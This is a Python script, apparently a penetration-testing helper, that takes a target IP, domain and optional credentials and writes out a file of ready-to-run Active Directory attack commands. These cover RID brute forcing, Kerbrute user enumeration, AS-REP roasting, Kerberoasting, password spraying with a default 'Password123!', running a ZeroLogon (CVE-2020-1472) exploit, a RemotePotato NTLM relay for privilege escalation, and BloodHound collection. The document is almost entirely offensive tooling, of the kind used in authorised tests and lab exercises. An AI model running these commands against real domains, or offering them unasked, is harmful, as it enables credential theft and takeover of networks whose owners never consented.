import sys

def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password):
    ascii_art = r"""
           (  )   /\   _                 (
            \ |  (  \ ( \.(               )            _____
          \  \ \  `  `   ) \             (  ___                 (  )   /\   _
       (_`    \+   . x   ( .\            \/   \          )      \ |  (  \ ( \.(               )            _____
      - .-               \+  ;          (     )        (  (     \  \ \  `  `   ) \             (  ___
           WELCOME TO      )  )        _)   ) _         )  )      (_`    \+   . x   ( .\            \/   \
         THE AD SYNTAX   (__/          \____/          (_(_()   - .-               \+  ;          (     )
               FILLER,    /             /               /                        )  )        _)   ) _
           SAVING YOU    (             (               /    made with love by bandors (__/          \____/
              TIME SINCE  2024

    """
    # Open the AD_output.txt file in write mode
    with open('AD_output.txt', 'w') as f:
        f.write(ascii_art + '\n')

        # Add the Zone Transfer section
        f.write("# Zone transfer (Unlikely with AD)\n")
        f.write(f"dig axfr {domain} @{target_ip}\n")
        f.write("\n")

        # Write the RID brute force commands
        f.write("# Guest RID brute\n")
        f.write(f"netexec smb {domain} -u anonymous -p '' --rid-brute 10000\n")
        f.write(f"impacket-lookupsid {domain}/anonymous@{target_ip}\n")
        f.write("\n")

        # If user credentials are provided, write commands using them
        if user and password:
            f.write("# Authenticated RID brute\n")
            f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000\n")
            f.write(f"impacket-lookupsid {domain}/{user}:'{password}'@{domain}\n")
            f.write("\n")

        # Write Kerbrute user enumeration command
        f.write("# Kerbrute user enumeration\n")
        f.write(f"kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}\n")
        f.write("\n")

        # Write RPC Enumeration commands
        f.write("# RPC Enumeration\n")
        if user:
            f.write(f"rpcclient -U \"{user}\" -N {target_ip}\n")
        else:
            f.write(f"rpcclient -U \"\" -N {target_ip}\n")
        f.write("\n")

        # Write As-Rep Roasting command
        f.write("# AS Rep Roasting\n")
        f.write(f"for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
        f.write("\n")

        # Write Kerberoasting commands
        f.write("# Kerberoasting\n")
        f.write(f"faketime -f +7h GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")

        if user and password:
            f.write(f"faketime -f +7h GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")

        f.write(f"GetUserSPNs.py -no-preauth '{user}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
        f.write("\n")

        # Write password spraying command with provided password
        f.write("# Password Spray\n")
        if user and password:
            f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n")
        else:
            f.write(f"netexec smb {target_ip} -u users.txt -p 'Password123!' --continue-on-success\n")
        f.write("\n")

        # Write LDAP enumeration commands
        f.write("# LDAP Enumeration\n")
        f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"dc={domain.split('.')[0]},dc={domain.split('.')[1]}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n")
        f.write(f"kerbrute userenum --dc {hostname}.{domain} -d {domain} users.txt\n")
        f.write("\n")

        # Write ZeroLogon check command
        f.write("# ZeroLogon Check\n")
        f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n")
        f.write("\n")

        # Write RemotePotato check commands
        f.write("# RemotePotato Check\n")
        f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
        f.write(f"sudo impacket-ntlmrelayx -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
        f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n")
        f.write("\n")

        # Write Bloodhound Python command
        f.write("# Bloodhound Python injestor\n")
        if user and password:
            f.write(f"faketime -f +7h bloodhound-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
        else:
            f.write(f"faketime -f +7h bloodhound-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
        f.write("\n")

        # Write Powerview.py enumeration commands (only if creds are provided)
        if user and password:
            f.write("# Powerview.py enumeration\n")
            f.write(f"faketime -f +7h getTGT.py {domain}/{user}:'{password}'\n")
            f.write(f"export KRB5CCNAME=./{user}.ccache\n")
            f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n")
            f.write("\n")
        
    print("AD_output.txt file generated successfully.")

if __name__ == "__main__":
    # Get sys args if you want to take from command line; here taking from direct input for simplicity
    target_ip = input("Enter Target IP: ")
    hostname = input("Enter Hostname: ")
    domain = input("Enter Domain: ")
    local_ip = input("Enter Local IP: ")
    user = input("Enter User (can be blank): ")
    password = input("Enter Password (can be blank): ")

    # Call the function to create the AD_output.txt file
    create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password)
